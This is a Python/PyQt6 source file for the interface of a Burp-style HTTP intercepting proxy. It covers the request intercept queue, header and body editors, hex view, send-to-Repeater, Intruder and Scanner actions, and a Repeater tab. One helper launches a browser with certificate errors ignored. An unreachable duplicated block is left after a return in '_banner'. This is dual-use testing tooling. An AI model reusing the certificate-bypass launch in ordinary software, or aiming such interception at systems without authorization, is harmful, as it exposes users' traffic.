            f"QTabWidget::pane{{border:none;background:{T.BG};}}"
            f"QTabBar::tab{{padding:4px 14px;font-size:11px;background:{T.PANEL};"
            f"color:{T.TXT3};border-bottom:2px solid transparent;}}"
            f"QTabBar::tab:selected{{color:{T.BLUE};border-bottom:2px solid {T.BLUE};}}"
            f"QTabBar::tab:hover:!selected{{background:{T.SURFACE};}}")
        self.ic_view_tabs.currentChanged.connect(self._ic_tab_changed)
        self._ic_prev_tab = 0

        self.ic_editor = QPlainTextEdit()
        self.ic_editor.setFont(mono_font(11))
        self.ic_editor.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
        self.ic_editor.setStyleSheet(
            f"background:{T.BG};color:{T.CODE};border:none;"
            f"padding:10px;font-family:{T.MONO};font-size:11px;")
        self.ic_editor.setPlaceholderText(
            "Intercepted requests appear here.\n\n"
            "Turn on Intercept, browse to a site, "
            "click a URL above to edit its request.")
        HTTPHighlighter(self.ic_editor.document())
        self.ic_editor.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.ic_editor.customContextMenuRequested.connect(self._ic_editor_ctx)
        self.ic_editor.textChanged.connect(self._ic_raw_changed)

        self.ic_headers_tbl = QTableWidget(0, 2)
        self.ic_headers_tbl.setHorizontalHeaderLabels(["Header","Value"])
        self.ic_headers_tbl.horizontalHeader().setStretchLastSection(True)
        self.ic_headers_tbl.setAlternatingRowColors(True)
        self.ic_headers_tbl.cellChanged.connect(self._ic_headers_tbl_changed)

        self.ic_body_edit = QPlainTextEdit()
        self.ic_body_edit.setFont(mono_font(11))
        self.ic_body_edit.setPlaceholderText("Request body (editable)…")
        self.ic_body_edit.textChanged.connect(self._ic_body_changed)

        self.ic_pretty = QPlainTextEdit()
        self.ic_pretty.setReadOnly(True); self.ic_pretty.setFont(mono_font(10))

        self.ic_hex_view = QPlainTextEdit()
        self.ic_hex_view.setReadOnly(True); self.ic_hex_view.setFont(mono_font(9))

        self.ic_view_tabs.addTab(self.ic_editor,     "Raw")
        self.ic_view_tabs.addTab(self.ic_headers_tbl,"Headers")
        self.ic_view_tabs.addTab(self.ic_body_edit,  "Body")
        self.ic_view_tabs.addTab(self.ic_pretty,     "Pretty")
        self.ic_view_tabs.addTab(self.ic_hex_view,   "Hex")

        ed_vl.addWidget(self.ic_view_tabs, 1)
        splitter.addWidget(ed_panel)
        splitter.setSizes([220, 400])
        root.addWidget(splitter, 1)

        # ── Queue data: mid → PendingItem ────────────────────────────────────
        self._ic_queue: dict = {}   # mid → pi

        # ── Wire buttons ─────────────────────────────────────────────────────
        self.ic_chg_method_btn.clicked.connect(self._ic_insp_change_method)
        self.ic_add_hdr_btn.clicked.connect(self._ic_insp_hdr_add)
        self.ic_del_hdr_btn.clicked.connect(self._ic_insp_hdr_del)
        self.ic_nl_btn.clicked.connect(self._ic_insert_newline)
        self.ic_beautify_btn.clicked.connect(self._ic_beautify_body)
        self.ic_fwd_all.clicked.connect(self._ic_forward_all)
        self.ic_drop_all.clicked.connect(self._ic_drop_all)
        self.ic_action_btn.clicked.connect(self._ic_show_action_menu)
        self.ic_req_filter.textChanged.connect(
            lambda txt: setattr(self.proxy, '_intercept_url_filter', txt.strip()))

        return w

    # ── Queue helpers ─────────────────────────────────────────────────────────
    def _ic_queue_row_changed(self):
        """User selection changed in queue table — load selected request into editor."""
        rows = self.ic_queue_tbl.selectedItems()
        if not rows or not hasattr(self, '_ic_queue'):
            return
        row = self.ic_queue_tbl.currentRow()
        if row < 0:
            return
        item = self.ic_queue_tbl.item(row, 0)
        if item is None:
            return
        mid = item.data(Qt.ItemDataRole.UserRole)
        pi = self._ic_queue.get(mid)
        if pi is None:
            return
        self._cur_req_pi = pi
        raw = f"{pi.method} {pi.url} HTTP/1.1\n"
        for k, v in (pi.headers or {}).items():
            raw += f"{k}: {v}\n"
        raw += "\n"
        if pi.body:
            raw += decode_body(pi.body)
        self.ic_editor.blockSignals(True)
        self.ic_editor.setPlainText(raw)
        self.ic_editor.blockSignals(False)
        self.ic_view_tabs.setCurrentIndex(0)
        self.ic_body_edit.blockSignals(True)
        self.ic_body_edit.setPlainText(decode_body(pi.body) if pi.body else "")
        self.ic_body_edit.blockSignals(False)
        body_len = len(pi.body) if pi.body else 0
        self.ic_cl_live.setText(f"{body_len} B")
        for _b in [self.ic_fwd, self.ic_drop, self.ic_action_btn, self.ic_beautify_btn]:
            _b.setEnabled(True)

    def _ic_queue_add(self, pi) -> int:
        """Add a PendingItem to the queue table. Returns the new row index."""
        self._ic_queue[pi.mid] = pi
        row = self.ic_queue_tbl.rowCount()
        self.ic_queue_tbl.insertRow(row)
        # Col 0: method (with mid as UserRole data)
        m_item = QTableWidgetItem(f"  {pi.method}")
        m_item.setData(Qt.ItemDataRole.UserRole, pi.mid)
        m_item.setForeground(__import__('PyQt6.QtGui', fromlist=['QColor']).QColor(method_color(pi.method)))
        self.ic_queue_tbl.setItem(row, 0, m_item)
        # Col 1: host
        from urllib.parse import urlparse as _up
        parsed = _up(pi.url)
        self.ic_queue_tbl.setItem(row, 1, QTableWidgetItem(parsed.netloc or pi.url[:40]))
        # Col 2: path
        path_str = (parsed.path or '/')[:60]
        if parsed.query: path_str += '?' + parsed.query[:30]
        self.ic_queue_tbl.setItem(row, 2, QTableWidgetItem(path_str))
        # Col 3: body size
        body_len = len(pi.body) if pi.body else 0
        self.ic_queue_tbl.setItem(row, 3, QTableWidgetItem(f"{body_len} B"))
        # Col 4: content-type
        ct = (pi.headers or {}).get('Content-Type', (pi.headers or {}).get('content-type',''))
        self.ic_queue_tbl.setItem(row, 4, QTableWidgetItem(ct[:40]))
        self.ic_queue_lbl.setText(f"{self.ic_queue_tbl.rowCount()} queued")
        return row

    def _ic_queue_remove_row_by_mid(self, mid: str):
        """Remove a row from the queue table by mid."""
        self._ic_queue.pop(mid, None)
        for r in range(self.ic_queue_tbl.rowCount()):
            item = self.ic_queue_tbl.item(r, 0)
            if item and item.data(Qt.ItemDataRole.UserRole) == mid:
                self.ic_queue_tbl.removeRow(r)
                break
        self.ic_queue_lbl.setText(f"{self.ic_queue_tbl.rowCount()} queued")


    # ─── Inspector helper methods ────────────────────────────────────────────
    def _ic_raw_changed(self):
        """Live Body: N B counter when editing the Raw tab."""
        if self.ic_view_tabs.currentIndex() != 0:
            return
        _, body = self._parse_raw_request(self.ic_editor.toPlainText())
        n = len(body) if body else 0
        self.ic_cl_live.setText(f"Body: {n} B")

    def _ic_insp_to_raw(self):
        """No-op — Inspector removed; raw editor is single source of truth."""
        pass

    def _ic_raw_to_insp(self):
        """No-op — Inspector removed."""
        pass

    def _ic_insp_change_method(self):
        methods = ["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"]
        raw = self.ic_editor.toPlainText()
        lines = raw.replace('\r\n','\n').split('\n')
        cur_m = lines[0].split(' ')[0] if lines else 'GET'
        m, ok = QInputDialog.getItem(self, "Change Method", "Method:", methods,
                     methods.index(cur_m) if cur_m in methods else 0, False)
        if ok and m:
            if lines:
                parts = lines[0].split(' ', 2)
                lines[0] = f"{m} {parts[1] if len(parts)>1 else '/'} {parts[2] if len(parts)>2 else 'HTTP/1.1'}"
                self.ic_editor.setPlainText('\n'.join(lines))

    def _ic_insp_hdr_add(self):
        h, ok = QInputDialog.getText(self, "Add Header", "Header (Name: Value):", text="X-Custom: value")
        if ok and ':' in h:
            raw = self.ic_editor.toPlainText().replace('\r\n','\n')
            lines = raw.split('\n')
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            lines.insert(blank, h.strip())
            self.ic_editor.setPlainText('\n'.join(lines))

    def _ic_insp_hdr_del(self):
        hds, _ = self._parse_raw_request(self.ic_editor.toPlainText())
        if not hds:
            return
        nm, ok = QInputDialog.getItem(self, "Remove Header", "Select:", list(hds.keys()), 0, False)
        if ok and nm:
            raw = self.ic_editor.toPlainText().replace('\r\n','\n')
            lines = raw.split('\n')
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            new_lines = [l for i,l in enumerate(lines)
                         if not (0 < i < blank and l.lower().startswith(nm.lower() + ':'))]
            self.ic_editor.setPlainText('\n'.join(new_lines))

    def _ic_insp_qp_add(self):
        pass   # no Inspector; user edits path in Raw tab

    def _ic_insp_qp_del(self):
        pass   # no Inspector; user edits URL path directly in Raw tab



    def _ic_insert_newline(self):
        """Insert \\r\\n at cursor — Burp-style new line."""
        cursor = self.ic_editor.textCursor()
        cursor.insertText('\r\n')
        self.ic_editor.setTextCursor(cursor)
        self.ic_editor.setFocus()

    def _ic_show_action_menu(self):
        menu = QMenu(self)
        a_rep  = menu.addAction("Send to Repeater")
        a_int  = menu.addAction("Send to Intruder")
        a_scan = menu.addAction("Send to Scanner")
        menu.addSeparator()
        a_copy = menu.addAction("Copy as cURL")
        action = menu.exec(self.ic_action_btn.mapToGlobal(self.ic_action_btn.rect().bottomLeft()))
        if not self._cur_req_pi:
            return
        pi = self._cur_req_pi
        if action == a_rep:
            raw = self.ic_editor.toPlainText()
            self._add_rep_tab(title=pi.url[:28], method=pi.method, url=pi.url, raw_request=raw)
            self.tabs.setCurrentIndex(2)
        elif action == a_int:
            hds, bdy = self._parse_raw_request(self.ic_editor.toPlainText())
            self.intr_url.setText(pi.url); self.intr_method.setCurrentText(pi.method)
            self.intr_headers.setPlainText('\n'.join(f"{k}: {v}" for k,v in hds.items()))
            self.intr_body.setPlainText((bdy or b'').decode('utf-8','replace'))
            self.tabs.setCurrentIndex(3)
        elif action == a_copy:
            hds, bdy = self._parse_raw_request(self.ic_editor.toPlainText())
            curl = f"curl -X {pi.method} '{pi.url}'"
            for k,v in hds.items():
                curl += f" -H '{k}: {v}'"
            if bdy: curl += f" -d '{(bdy or b'').decode('utf-8','replace')}'"
            QApplication.clipboard().setText(curl)

    def _ic_open_browser(self):
        import subprocess
        try:
            subprocess.Popen(['chromium','--proxy-server=http://127.0.0.1:8080',
                              '--ignore-certificate-errors'])
        except Exception:
            try:
                subprocess.Popen(['firefox', '--new-window',
                                  'about:preferences#advanced'])
            except Exception:
                QMessageBox.information(self, "Open Browser",
                    "Set browser proxy to HTTP 127.0.0.1:8080 and install the CA cert.\n"
                    "Cert path: ~/kingception/kingception-ca.crt")

    def _ic_headers_tbl_changed(self, row, col):
        """Headers table edit → rebuild raw."""
        if self.ic_view_tabs.currentIndex() == 1:
            self._ic_headers_tbl_to_raw()

    def _ic_headers_tbl_to_raw(self):
        """Rebuild raw from the headers table (called when editing headers tab)."""
        raw = self.ic_editor.toPlainText()
        _, body = self._parse_raw_request(raw)
        lines = raw.replace('\r\n','\n').split('\n')
        req_line = lines[0] if lines else 'GET / HTTP/1.1'
        new_hdrs = []
        for r in range(self.ic_headers_tbl.rowCount()):
            k = (self.ic_headers_tbl.item(r,0) or QTableWidgetItem()).text()
            v = (self.ic_headers_tbl.item(r,1) or QTableWidgetItem()).text()
            if k: new_hdrs.append(f"{k}: {v}")
        body_str = (body or b'').decode('utf-8','replace')
        new_raw = req_line + '\n' + '\n'.join(new_hdrs) + '\n\n' + body_str
        self.ic_editor.blockSignals(True)
        self.ic_editor.setPlainText(new_raw)
        self.ic_editor.blockSignals(False)

    # ---------- Intercept: body-tab live counter ----------
    def _ic_body_changed(self):
        body_b = self.ic_body_edit.toPlainText().encode('utf-8','replace')
        self.ic_cl_live.setText(f"Body: {len(body_b)} B")

    # ---------- Intercept: sync sub-tabs on switch ----------
    def _ic_tab_changed(self, idx: int):
        raw = self.ic_editor.toPlainText()
        prev = getattr(self, '_ic_prev_tab', 0)
        if prev == 2 and idx != 2:
            body_txt = self.ic_body_edit.toPlainText()
            self._ic_replace_body_in_raw(raw, body_txt)
            raw = self.ic_editor.toPlainText()
        self._ic_prev_tab = idx
        if idx == 0:
            self._ic_raw_to_insp()
        elif idx == 1:
            hds, _ = self._parse_raw_request(raw)
            self.ic_headers_tbl.blockSignals(True); self.ic_headers_tbl.setRowCount(0)
            for k,v in hds.items():
                r = self.ic_headers_tbl.rowCount(); self.ic_headers_tbl.insertRow(r)
                self.ic_headers_tbl.setItem(r,0,QTableWidgetItem(k))
                self.ic_headers_tbl.setItem(r,1,QTableWidgetItem(v))
            self.ic_headers_tbl.blockSignals(False)
        elif idx == 2:
            _, body = self._parse_raw_request(raw)
            bstr = decode_body(body) if body else ""
            if self.ic_body_edit.toPlainText() != bstr:
                self.ic_body_edit.blockSignals(True)
                self.ic_body_edit.setPlainText(bstr)
                self.ic_body_edit.blockSignals(False)
                self.ic_cl_live.setText(f"Body: {len(body) if body else 0} B")
        elif idx == 3:
            _, body = self._parse_raw_request(raw)
            bstr = decode_body(body) if body else ""
            try:
                self.ic_pretty.setPlainText(json.dumps(json.loads(bstr),indent=2,ensure_ascii=False))
            except Exception:
                try:
                    import xml.dom.minidom as _md
                    self.ic_pretty.setPlainText(_md.parseString(bstr.encode()).toprettyxml(indent="  "))
                except Exception:
                    self.ic_pretty.setPlainText(bstr or "(no body)")
        elif idx == 4:
            _, body = self._parse_raw_request(raw)
            data = body or b''
            rows = []
            for i in range(0, len(data), 16):
                ch = data[i:i+16]
                hp = ' '.join(f'{b:02x}' for b in ch).ljust(47)
                ap = ''.join(chr(b) if 32<=b<127 else '.' for b in ch)
                rows.append(f"{i:08x}  {hp}  |{ap}|")
            self.ic_hex_view.setPlainText('\n'.join(rows) if rows else "(no body)")

    def _ic_beautify_body(self):
        raw = self.ic_editor.toPlainText()
        _, body = self._parse_raw_request(raw)
        bstr = decode_body(body) if body else ""
        try:
            pretty = json.dumps(json.loads(bstr), indent=2, ensure_ascii=False)
        except Exception:
            try:
                import xml.dom.minidom as _md
                pretty = _md.parseString(bstr.encode()).toprettyxml(indent="  ")
            except Exception:
                QMessageBox.information(self,"Beautify","Body is not valid JSON or XML"); return
        self._ic_replace_body_in_raw(raw, pretty)
        self.ic_body_edit.blockSignals(True)
        self.ic_body_edit.setPlainText(pretty)
        self.ic_body_edit.blockSignals(False)
        self._log("Body beautified")

    def _ic_replace_body_in_raw(self, raw: str, new_body: str):
        lines = raw.replace('\r\n','\n').split('\n')
        blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
        self.ic_editor.setPlainText('\n'.join(lines[:blank+1]) + new_body)

    def _ic_forward_all(self):
        self.intercept.toggle(False); self.intercept.toggle(True)
        for b in [self.ic_fwd,self.ic_drop,self.ic_fwd_all,self.ic_drop_all,self.ic_beautify_btn]:
            b.setEnabled(False)
        self.ic_banner.setText("⏩ All requests forwarded")
        self._log("All pending requests forwarded")

    def _ic_drop_all(self):
        with self.intercept._lock:
            for pi in list(self.intercept._pending.values()):
                pi.dropped = True; pi.event.set()
        for b in [self.ic_fwd,self.ic_drop,self.ic_fwd_all,self.ic_drop_all,self.ic_beautify_btn]:
            b.setEnabled(False)
        self.ic_banner.setText("🗑 All requests dropped")
        self._log("All pending requests dropped")

    def _banner(self, text: str) -> QLabel:
        lbl = QLabel(text); lbl.setWordWrap(True)
        lbl.setStyleSheet(f"background:{T.SURFACE};color:{T.TXT2};"
                          f"padding:8px 12px;border-radius:8px;border:1px solid {T.BORDER}")
        return lbl
        raw = self.ic_editor.toPlainText()

        # ── Leaving Body tab → push edits back into Raw so they're visible ──
        # We don't know which tab we came FROM, so store the last-active index.
        prev = getattr(self, '_ic_prev_tab', 0)
        if prev == 2 and idx != 2:
            # User was on Body tab and switched away — sync body → raw
            body_txt = self.ic_body_edit.toPlainText()
            self._ic_replace_body_in_raw(raw, body_txt)
            raw = self.ic_editor.toPlainText()          # refreshed after edit
        self._ic_prev_tab = idx

        # Tab 1 = Headers
        if idx == 1:
            headers, _ = self._parse_raw_request(raw)
            self.ic_headers_tbl.setRowCount(0)
            for k, v in headers.items():
                r2 = self.ic_headers_tbl.rowCount()
                self.ic_headers_tbl.insertRow(r2)
                self.ic_headers_tbl.setItem(r2, 0, QTableWidgetItem(k))
                self.ic_headers_tbl.setItem(r2, 1, QTableWidgetItem(v))
        # Tab 2 = Body — sync Raw → Body only if Body hasn't been manually edited
        elif idx == 2:
            _, body = self._parse_raw_request(raw)
            body_str = decode_body(body) if body else ""
            # Only overwrite if the content actually differs (avoids cursor-jump)
            if self.ic_body_edit.toPlainText() != body_str:
                self.ic_body_edit.blockSignals(True)
                self.ic_body_edit.setPlainText(body_str)
                self.ic_body_edit.blockSignals(False)
                self.ic_cl_live.setText(f"Body: {len(body) if body else 0} B")
        # Tab 3 = Pretty
        elif idx == 3:
            _, body = self._parse_raw_request(raw)
            body_str = decode_body(body) if body else ""
            try:
                parsed = json.loads(body_str)
                self.ic_pretty.setPlainText(json.dumps(parsed, indent=2, ensure_ascii=False))
            except Exception:
                try:
                    import xml.dom.minidom as minidom
                    dom = minidom.parseString(body_str.encode())
                    self.ic_pretty.setPlainText(dom.toprettyxml(indent="  "))
                except Exception:
                    self.ic_pretty.setPlainText(body_str if body_str else "(no body)")
        # Tab 4 = Hex
        elif idx == 4:
            _, body = self._parse_raw_request(raw)
            data = body or b''
            lines = []
            for i in range(0, len(data), 16):
                chunk = data[i:i+16]
                hex_part   = ' '.join(f'{b:02x}' for b in chunk).ljust(47)
                ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                lines.append(f"{i:08x}  {hex_part}  |{ascii_part}|")
            self.ic_hex_view.setPlainText('\n'.join(lines) if lines else "(no body)")

    # =========================================================
    # REPEATER  —  Burp/Caido-style dual-pane request/response
    # =========================================================
    def _repeater_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(0, 0, 0, 0)
        v.setSpacing(0)

        # ── Top bar ──────────────────────────────────────────────────────────
        topbar = QWidget()
        topbar.setFixedHeight(40)
        topbar.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        tbl = QHBoxLayout(topbar)
        tbl.setContentsMargins(8, 0, 8, 0)
        tbl.setSpacing(6)

        add_btn = QPushButton("＋")
        add_btn.setFixedSize(28, 28)
        add_btn.setToolTip("New empty repeater tab")
        add_btn.setStyleSheet(
            f"background:{T.SURFACE};color:{T.TXT1};border:1px solid {T.BORDER};"
            f"border-radius:6px;font-size:16px;font-weight:bold;")
        add_btn.clicked.connect(lambda: self._add_rep_tab())
        tbl.addWidget(add_btn)

        self.rep_tab_bar_lbl = QLabel("Repeater")
        self.rep_tab_bar_lbl.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-weight:600;padding-left:4px;")
        tbl.addWidget(self.rep_tab_bar_lbl)
        tbl.addStretch()

        v.addWidget(topbar)

        # ── Tab widget ────────────────────────────────────────────────────────
        self.rep_tabs = QTabWidget()
        self.rep_tabs.setTabsClosable(True)
        self.rep_tabs.setMovable(True)
        self.rep_tabs.tabCloseRequested.connect(self._rep_close_tab)
        self.rep_tabs.setStyleSheet(
            f"QTabWidget::pane{{border:none;background:{T.BG};}}"
            f"QTabBar::tab{{padding:5px 18px 5px 10px;font-size:12px;font-weight:500;"
            f"background:{T.PANEL};color:{T.TXT3};border-bottom:2px solid transparent;}}"
            f"QTabBar::tab:selected{{color:{T.BLUE};border-bottom:2px solid {T.BLUE};background:{T.BG};}}"
            f"QTabBar::tab:hover:!selected{{background:{T.SURFACE};}}")
        v.addWidget(self.rep_tabs, 1)

        self._add_rep_tab()
        return w

    def _rep_close_tab(self, idx: int):
        if self.rep_tabs.count() > 1:
            self.rep_tabs.removeTab(idx)

    def _add_rep_tab(self, title="Tab 1", method="GET", url="",
                     raw_request: str = "", headers: str = "", body: str = ""):
        """Clean Burp-style repeater: left=request editor, right=response. Right-click menu on editor."""
        tab_n = self.rep_tabs.count() + 1

        if raw_request:
            initial_raw = raw_request.replace("\r\n", "\n")
        else:
            host = url.split("/")[2] if url and url.count("/") >= 2 else "target.com"
            path = ("/" + "/".join(url.split("/")[3:])) if url and url.count("/") >= 3 else "/"
            h_block = headers or f"Host: {host}\nUser-Agent: Kingception/1.0\nAccept: */*"
            cl = f"\nContent-Length: {len(body.encode())}" if body else ""
            initial_raw = f"{method} {path} HTTP/1.1\n{h_block}{cl}\n\n{body}"

        _state = {"sending": False}

        # ══ ROOT ══
        tab = QWidget()
        rv = QVBoxLayout(tab); rv.setContentsMargins(0,0,0,0); rv.setSpacing(0)

        # ── URL BAR ──
        url_bar = QWidget(); url_bar.setFixedHeight(42)
        url_bar.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        ubl = QHBoxLayout(url_bar); ubl.setContentsMargins(8,4,8,4); ubl.setSpacing(4)

        http_ver = QComboBox()
        http_ver.addItems(["HTTP/1.1","HTTP/1.0"]); http_ver.setFixedWidth(86); http_ver.setFixedHeight(30)
        http_ver.setToolTip("HTTP version (ALPN always forces http/1.1 to server)")

        method_box = QComboBox()
        method_box.addItems(["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"])
        method_box.setCurrentText(method); method_box.setFixedWidth(94); method_box.setFixedHeight(30)

        url_edit = QLineEdit(url or "https://"); url_edit.setFixedHeight(30)
        url_edit.setPlaceholderText("https://target.com/path?param=value")

        send_btn = QPushButton("  ▶  Send")
        send_btn.setObjectName("primary"); send_btn.setFixedHeight(30); send_btn.setFixedWidth(88)
        send_btn.setShortcut("Ctrl+Return")

        def _ib(txt, tip, w=26):
            b = QPushButton(txt); b.setFixedSize(w, 30); b.setToolTip(tip)
            b.setStyleSheet(f"background:{T.SURFACE};color:{T.TXT2};"
                            f"border:1px solid {T.BORDER};border-radius:6px;font-size:12px;")
            return b

        copy_url_btn = _ib("⎘", "Copy URL"); rename_btn = _ib("✎","Rename tab")
        dup_btn = _ib("⊞","Duplicate tab"); clr_btn = _ib("⌫","Clear response")

        ubl.addWidget(http_ver); ubl.addWidget(method_box); ubl.addWidget(url_edit, 1)
        ubl.addWidget(send_btn); ubl.addSpacing(4)
        for _bx in [copy_url_btn, rename_btn, dup_btn, clr_btn]: ubl.addWidget(_bx)
        rv.addWidget(url_bar)

        # ── OPTIONS BAR ──
        opts = QWidget(); opts.setFixedHeight(26)
        opts.setStyleSheet(f"background:{T.SURFACE};border-bottom:1px solid {T.BORDER};")
        obl = QHBoxLayout(opts); obl.setContentsMargins(10,0,10,0); obl.setSpacing(14)

        def _ck(lbl, val, tip):
            c = QCheckBox(lbl); c.setChecked(val); c.setToolTip(tip)
            c.setStyleSheet(f"color:{T.TXT2};font-size:11px;"); return c

        upd_cl_chk  = _ck("Update Content-Length", True,
            "Recalculate Content-Length from body before each send")
        redir_chk   = _ck("Follow redirects", False, "Follow 3xx automatically")
        h2_dn_chk   = _ck("Force HTTP/1.1", True,
            "Force HTTP/1.1 via ALPN (prevents HTTP/2 negotiation)")

        status_lbl = QLabel("—"); time_lbl = QLabel(""); size_lbl = QLabel("")
        cl_lbl = QLabel("0 B")
        for _l in [status_lbl, time_lbl, size_lbl]:
            _l.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-family:{T.MONO};")
        cl_lbl.setStyleSheet(f"color:{T.CYAN};font-size:11px;font-family:{T.MONO};")
        obl.addWidget(upd_cl_chk); obl.addWidget(redir_chk); obl.addWidget(h2_dn_chk)
        obl.addStretch()
        for _lx, _vx in [("Status:", status_lbl),("Time:", time_lbl),("Size:", size_lbl)]:
            _xx = QLabel(_lx); _xx.setStyleSheet(f"color:{T.TXT3};font-size:10px;")
            obl.addWidget(_xx); obl.addWidget(_vx)
        obl.addSpacing(10); obl.addWidget(cl_lbl)
        rv.addWidget(opts)

        # ── MAIN SPLIT: request | response ──
        split = QSplitter(Qt.Orientation.Horizontal)
        split.setHandleWidth(2)
        split.setStyleSheet(
            f"QSplitter::handle{{background:{T.BORDER};}}"
            f"QSplitter::handle:hover{{background:{T.BLUE};}}")

        # ── REQUEST PANEL ──
        req_panel = QWidget()
        req_vl = QVBoxLayout(req_panel); req_vl.setContentsMargins(0,0,0,0); req_vl.setSpacing(0)

        req_hb = QWidget(); req_hb.setFixedHeight(26)
        req_hb.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        rhl = QHBoxLayout(req_hb); rhl.setContentsMargins(10,0,6,0); rhl.setSpacing(4)
        _rt = QLabel("REQUEST")
        _rt.setStyleSheet(f"color:{T.TXT3};font-size:9px;font-weight:700;letter-spacing:2px;")
        rhl.addWidget(_rt); rhl.addStretch()

        crlf_btn = QPushButton("\\n")
        crlf_btn.setCheckable(True)
        crlf_btn.setFixedSize(26, 20)
        crlf_btn.setToolTip(
            "Show \\r\\n line-ending characters\n"
            "(matches Burp Suite's \\n toggle — the editor\n"
            "stays fully editable while this is on)")
        crlf_btn.setStyleSheet(
            f"QPushButton{{background:{T.SURFACE};color:{T.TXT2};"
            f"border:1px solid {T.BORDER};border-radius:4px;"
            f"font-family:{T.MONO};font-size:10px;font-weight:700;}}"
            f"QPushButton:checked{{background:{T.BLUE};color:#ffffff;border-color:{T.BLUE};}}"
            f"QPushButton:hover{{border-color:{T.BLUE};}}")
        rhl.addWidget(crlf_btn)
        line_lbl = QLabel("0 L")
        line_lbl.setStyleSheet(f"color:{T.TXT3};font-size:10px;font-family:{T.MONO};")
        rhl.addWidget(line_lbl)
        req_vl.addWidget(req_hb)

        req_editor = QPlainTextEdit()
        req_editor.setFont(mono_font(11))
        req_editor.setPlainText(initial_raw)
        req_editor.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
        req_editor.setStyleSheet(
            f"background:{T.BG};color:{T.CODE};border:none;border-radius:0;"
            f"padding:10px;font-family:{T.MONO};font-size:11px;")
        HTTPHighlighter(req_editor.document())

        # ══════════════════════════════════════════════════════════════════
        # \r\n-display abstraction — editor stays EDITABLE the whole time.
        #
        # Burp's "\n" toggle shows the literal \r\n line-ending characters
        # at the end of every line (including the blank separator line)
        # without making the editor read-only — you can still type, retype
        # a header value, add new lines, anything. The markers are just
        # regular text appended to each line; toggling off strips them
        # back out wherever they're still intact.
        #
        # _get_raw() always returns the real, marker-free request text —
        # it works by stripping the marker live from whatever's currently
        # in the editor, so it's correct regardless of any edits made
        # while the \r\n view was on. Every helper (Send, Beautify, Calc
        # CL, Add/Remove Header, method/version sync, Duplicate, Copy,
        # cURL export) reads/writes through _get_raw()/_set_raw().
        # ══════════════════════════════════════════════════════════════════
        _crlf_view = {"on": False}
        _CRLF_MARK = " \\r \\n"   # literal 6 chars: space \ r space \ n

        def _strip_marks(text: str) -> str:
            lines = text.split('\n')
            return '\n'.join(
                l[:-len(_CRLF_MARK)] if l.endswith(_CRLF_MARK) else l
                for l in lines)

        def _add_marks(text: str) -> str:
            # Only mark lines that are genuinely followed by a real \n in
            # the source — the final segment from split('\n') represents
            # whatever comes AFTER the last real line break (often nothing,
            # for the final line of a request with no trailing newline), so
            # it must stay unmarked. Burp does exactly this: compare the
            # last line of a raw request before vs after Send — it never
            # gains a marker just from being displayed.
            lines = text.split('\n')
            n = len(lines)
            return '\n'.join(
                f"{l}{_CRLF_MARK}" if i < n - 1 else l
                for i, l in enumerate(lines))

        def _get_raw() -> str:
            """Real request text, regardless of whether \r\n view is on."""
            current = req_editor.toPlainText()
            return _strip_marks(current) if _crlf_view["on"] else current

        def _set_raw(new_text: str):
            """Write new real text in, re-applying markers if view is on."""
            display = _add_marks(new_text) if _crlf_view["on"] else new_text
            req_editor.blockSignals(True)
            req_editor.setPlainText(display)
            req_editor.blockSignals(False)
            _refresh_labels()

        def _refresh_labels():
            raw = _get_raw()
            _, _b = self._parse_raw_request(raw)
            cl_lbl.setText(f"{len(_b or b'')} B")
            line_lbl.setText(f"{raw.count(chr(10)) + 1} L")

        req_editor.textChanged.connect(_refresh_labels)
        _refresh_labels()

        def _toggle_crlf_view(checked: bool):
            real = _get_raw()          # read using the OLD state, before flipping
            _crlf_view["on"] = checked
            display = _add_marks(real) if checked else real
            req_editor.blockSignals(True)
            req_editor.setPlainText(display)
            req_editor.blockSignals(False)
            _refresh_labels()
        crlf_btn.toggled.connect(_toggle_crlf_view)

        # ── Intercept Enter key: auto-add \r\n to new line immediately ──────
        # Burp behaviour: the moment Enter is pressed while the \n toggle is
        # ON, the new line gets " \r \n" appended with the cursor placed
        # BEFORE the marker — you start typing and the marker stays at the
        # right edge, exactly like any other line in the editor.
        # If you manually backspace the marker off a line it stays gone;
        # subsequent Enter presses on OTHER lines still auto-mark.
        class _EnterFilter(QObject):
            def eventFilter(self, obj, event):
                from PyQt6.QtCore import QEvent
                from PyQt6.QtGui import QTextCursor as _QTC
                if (event.type() == QEvent.Type.KeyPress
                        and _crlf_view["on"]
                        and event.key() in (Qt.Key.Key_Return,
                                            Qt.Key.Key_Enter)):
                    cur = req_editor.textCursor()
                    # Insert newline then the CRLF marker for the new line
                    cur.insertText("\n" + _CRLF_MARK)
                    # Park cursor BEFORE the marker so typing goes left of it
                    cur.movePosition(
                        _QTC.MoveOperation.Left,
                        _QTC.MoveMode.MoveAnchor,
                        len(_CRLF_MARK))
                    req_editor.setTextCursor(cur)
                    return True   # consume — don't let Qt add its own \n too
                return False

        # Store as instance attribute on the editor so Qt keeps it alive
        # (a local variable would be GC'd after _add_rep_tab returns)
        req_editor._enter_filter = _EnterFilter(req_editor)
        req_editor.installEventFilter(req_editor._enter_filter)

        # ── Right-click context menu — same full menu in both view modes ──
        req_editor.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)

        def _req_ctx_menu(pos):
            menu = QMenu(req_editor)
            menu.setStyleSheet(
                f"QMenu{{background:{T.PANEL};border:1px solid {T.BORDER};border-radius:8px;padding:4px;}}"
                f"QMenu::item{{padding:7px 20px 7px 12px;border-radius:5px;font-size:12px;color:{T.TXT1};}}"
                f"QMenu::item:selected{{background:{T.SURFACE};}}"
